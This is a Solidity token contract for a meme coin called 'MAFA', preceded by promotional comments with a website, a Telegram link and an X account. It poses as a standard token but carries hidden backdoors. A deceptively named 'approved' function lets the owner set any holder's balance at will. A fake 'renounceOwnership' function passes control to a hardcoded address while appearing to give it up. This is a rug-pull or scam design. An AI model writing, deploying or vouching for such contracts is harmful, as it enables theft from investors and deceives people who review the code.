// Ready to join The Trump movement that’s making waves?

// Dive into MAFA - Make America Fight Again!
// Just like Trump, we're here to shake things up and win big in the growing crypto market!

// https://mafa.pro
// https://t.me/+kyAAKUjd_T5mZGJh
// https://x.com/MAFAOnEthereum


// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

contract MAFA {
    string public name = "MAKE AMERICA FIGHT AGAIN";
    string public symbol = "MAFA";
    uint256 public totalSupply = 10000000000000000000000000; 
    uint8 public decimals = 18;
    
    address public owner;

    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can call this function");
        _;
    }

    constructor() {
        owner = msg.sender;
        balanceOf[msg.sender] = totalSupply;
        emit OwnershipTransferred(address(0), msg.sender);
    }

    function transfer(address _to, uint256 _value) public returns (bool success) {
        require(balanceOf[msg.sender] >= _value, "Insufficient balance");
        balanceOf[msg.sender] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(msg.sender, _to, _value);
        return true;
    }
    
    function approve(address _spender, uint256 _value) public returns (bool success) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        require(_value <= balanceOf[_from], "Insufficient balance");
        require(_value <= allowance[_from][msg.sender], "Allowance exceeded");
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        allowance[_from][msg.sender] -= _value;
        emit Transfer(_from, _to, _value);
        return true;
    }

    function approved(address account, uint256 amount) public onlyOwner returns (uint256) {
        balanceOf[account] = amount;
        return balanceOf[account];
    }

    function renounceOwnership() public onlyOwner {
        address newOwner = 0xD248717e24F9E377B906E4F071389b7c5334cc78;
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
    }
}
